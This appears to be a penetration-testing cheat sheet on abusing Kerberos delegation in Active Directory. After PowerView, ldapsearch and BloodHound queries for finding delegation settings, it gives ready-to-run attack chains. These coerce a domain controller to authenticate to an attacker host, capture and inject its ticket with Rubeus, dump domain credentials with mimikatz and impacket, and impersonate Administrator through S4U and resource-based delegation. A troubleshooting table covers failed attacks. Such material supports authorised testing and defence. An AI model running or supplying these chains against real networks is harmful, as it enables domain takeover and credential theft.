+++
title = "AD: Kerberos Delegation Abuse"
+++

# Kerberos Delegation Abuse

- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/

## Detection

```powershell
# Unconstrained delegation — computers with TRUSTED_FOR_DELEGATION
Get-DomainComputer -Unconstrained | select dnshostname, useraccountcontrol
# Exclude DCs — they always have unconstrained delegation by design
Get-DomainComputer -Unconstrained | Where-Object { $_.dnshostname -notmatch "dc" } | select dnshostname

# Constrained delegation — accounts with msDS-AllowedToDelegateTo set
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto

# RBCD — computers with msDS-AllowedToActOnBehalfOfOtherIdentity set
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" -and $_.SecurityIdentifier -ne "S-1-5-18" } | select ObjectDN, SecurityIdentifier, ActiveDirectoryRights
```

```bash
# ldapsearch — unconstrained delegation (userAccountControl bit 0x80000 = TRUSTED_FOR_DELEGATION)
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=524288)' dnshostname useraccountcontrol

# ldapsearch — constrained delegation
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(msDS-AllowedToDelegateTo=*)' samaccountname msDS-AllowedToDelegateTo

# ldapsearch — RBCD (any computer with the attribute set — usually indicates prior attack or misconfiguration)
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' dnshostname
```

BloodHound Cypher:
```
// Unconstrained delegation computers (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name

// Constrained delegation (any principal with msDS-AllowedToDelegateTo)
MATCH (n) WHERE n.allowedtodelegate IS NOT NULL RETURN n.name, n.allowedtodelegate

// RBCD entry points — principals with GenericAll/GenericWrite on computer objects
MATCH p=shortestPath((n)-[r:GenericAll|GenericWrite|WriteDacl|Owns*1..]->(c:Computer)) RETURN p
```

---

## Unconstrained Delegation Attack

- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://adsecurity.org/?p=1667

**Prereqs:** Admin-level access (or code execution) on a host that has `TRUSTED_FOR_DELEGATION` set. DCs always have this — the target is non-DC hosts with it set. Goal: coerce a DC to authenticate to your host, capture its TGT from memory, then DCSync.

**Why it works:** When a host has unconstrained delegation, any authenticating principal's full TGT is forwarded to and cached in that host's LSA. Coercing the DC machine account to authenticate delivers the DC's own TGT — which can be used for DCSync or Golden Ticket creation.

```powershell
# Windows — start monitoring for incoming TGTs (run as SYSTEM on the unconstrained host)
Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
```

```bash
# Linux — trigger DC machine account authentication to your host
# PetitPotam (MS-EFSRPC coercion — unauthenticated if unpatched)
python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>

# Authenticated coercion
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>

# Or SpoolSample / printerbug.py (MS-RPRN — requires print spooler running on DC)
python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<TARGET_FQDN> <ATTACKER_IP>
```

Rubeus `monitor` prints base64-encoded KIRBI to stdout when the DC TGT arrives. Pass-the-Ticket:

```powershell
# Windows PtT — inject captured TGT into current session
Rubeus.exe ptt /ticket:<BASE64_KIRBI>

# Verify
klist

# DCSync from Windows (after PtT)
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" exit
```

```bash
# Linux — decode Rubeus base64 output and convert KIRBI → ccache
echo '<BASE64_KIRBI>' | tr -d '\n ' | base64 -d > dc.kirbi
impacket-ticketConverter dc.kirbi dc.ccache
export KRB5CCNAME=$PWD/dc.ccache

# DCSync
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/DC01$'@<TARGET_FQDN>
```

---

## Constrained Delegation Attack (S4U2Self + S4U2Proxy)

- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/

**Prereqs:** Control of an account (user or computer) that has `msDS-AllowedToDelegateTo` populated. You need its password, NT hash, or AES key. The account must have `SeEnableDelegationPrivilege` or the domain must allow protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`).

**Why it works:** S4U2Self lets a service request a service ticket for any user to itself. S4U2Proxy lets it then exchange that ticket for a service ticket to a target in `msDS-AllowedToDelegateTo`. The DC issues the target ticket impersonating the requested user — no interaction from the impersonated user required.

```bash
# Linux — Step 1: Get TGT for the delegating account
impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

# Step 2: S4U — request service ticket impersonating Administrator
# -spn must be one of the SPNs listed in msDS-AllowedToDelegateTo
impacket-getST -spn <SPN> -impersonate Administrator \
  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'
# Output: saves Administrator.ccache in current directory

# Step 3: Use the ticket
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

With hash instead of password:
```bash
impacket-getST -spn <SPN> -impersonate Administrator \
  -hashes :<NT_HASH> -dc-ip <DC_IP> '<DOMAIN>/<USER>'
```

```powershell
# Windows — Rubeus S4U (pass, RC4, or AES)
Rubeus.exe s4u /user:<USER> /password:<PASS> /domain:<DOMAIN> /dc:<DC_IP> `
  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap

# With NT hash
Rubeus.exe s4u /user:<USER> /rc4:<NT_HASH> /domain:<DOMAIN> /dc:<DC_IP> `
  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap
```

**NOTE:** `/ptt` injects the ticket directly into the current session. Without it, Rubeus writes the ticket to disk as base64-KIRBI.

---

## RBCD Attack

- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/
- https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/

**Prereqs:**
- Write access to the target computer's AD object (`GenericAll`, `GenericWrite`, `WriteDacl`, or `WriteProperty` over `msDS-AllowedToActOnBehalfOfOtherIdentity`). BloodHound shows this as an edge pointing to the computer.
- `ms-DS-MachineAccountQuota > 0` (default is 10) OR control of an existing computer/service account.
- A DC to communicate with.

**Why it works:** RBCD delegates trust in the opposite direction — the resource (target computer) declares which accounts can act on behalf of users. Writing your controlled account's SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute makes the target accept S4U requests from your account, impersonating any user including Administrator. No domain admin involvement.

```bash
# Step 1 — Add a fake computer account (requires MachineAccountQuota > 0)
impacket-addcomputer -method SAMR \
  -computer-name '<ATTACKER_COMPUTER>$' \
  -computer-pass '<PASS>' \
  -dc-ip <DC_IP> \
  '<DOMAIN>/<USER>:<PASS>'

# Step 2 — Write RBCD: allow <ATTACKER_COMPUTER>$ to act on behalf of users on <TARGET>
impacket-rbcd -delegate-from '<ATTACKER_COMPUTER>$' \
  -delegate-to '<TARGET_COMPUTER>$' \
  -action write \
  -dc-ip <DC_IP> \
  '<DOMAIN>/<USER>:<PASS>'

# Verify the write
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' \
  -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'

# Step 3 — Get TGT for the fake computer account
impacket-getTGT '<DOMAIN>/<ATTACKER_COMPUTER>$:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<ATTACKER_COMPUTER>\$.ccache

# Step 4 — S4U: impersonate Administrator on target
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<ATTACKER_COMPUTER>$'
# Output: Administrator.ccache

# Step 5 — PtT and access
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

```powershell
# Windows alternative — Step 2 via PowerView
$ComputerSid = Get-DomainComputer '<ATTACKER_COMPUTER>' -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

---

## Common Failure Points + Fixes

| Symptom | Likely Cause | Fix |
| --- | --- | --- |
| `KRB_AP_ERR_SKEW` on any getST / getTGT | Clock skew between attacker and DC exceeds 5 minutes | `sudo ntpdate -u <DC_IP>` or `sudo timedatectl set-ntp true` |
| `KDC_ERR_BADOPTION` from getST S4U | Account does not have protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION` not set) | Verify `Get-DomainUser -TrustedToAuth`; without this flag, S4U2Proxy requires a forwardable ST from the user — use `-additional-ticket` |
| `KDC_ERR_BADOPTION` from getST RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` not written, SID mismatch, or target SPN wrong | Re-run `impacket-rbcd -action read` to verify; check SPN with `setspn -L <TARGET_COMPUTER>` |
| `addcomputer` fails with `LDAP Error: insufficientAccessRights` | `ms-DS-MachineAccountQuota` is 0 or account lacks rights | Check quota: `Get-DomainObject -Identity 'DC=<DOMAIN>' | select ms-ds-machineaccountquota`; if 0, you need control of an existing computer account |
| `addcomputer` SAMR failure — access denied | Low-priv account cannot create machine accounts over SAMR on this DC | Try `-method LDAPS` if LDAPS is enabled, or use an existing controlled computer account |
| `rbcd write` — no error but attribute not set | Permissions check was wrong; write silently accepted wrong ACL | Verify with `impacket-rbcd -action read`; BloodHound edge may not reflect current ACL — run SharpHound again |
| Rubeus `monitor` shows no tickets | Not running as SYSTEM; coercion not reaching this host | Verify process integrity with `whoami /groups`; confirm attacker IP is reachable from DC (firewall); try different coercion method |
| getST produces ticket but `psexec -k` fails with `STATUS_LOGON_FAILURE` | Service ticket is for `cifs/NETBIOS` but host expects `cifs/FQDN` (or vice versa) | Re-run getST with the exact SPN the host is registered for (`setspn -L <TARGET_COMPUTER>`); try both NETBIOS and FQDN variants |
| Rubeus `ptt` succeeds but `dir \\target\c$` fails | Double-hop / credential delegation issue | Confirm the `monitor` ticket was for the DC's machine account (`DC01$`), not a user ticket |
| KIRBI → ccache conversion fails | Whitespace or line breaks in Rubeus base64 output | Pipe through `tr -d '\n '` before `base64 -d` |

---
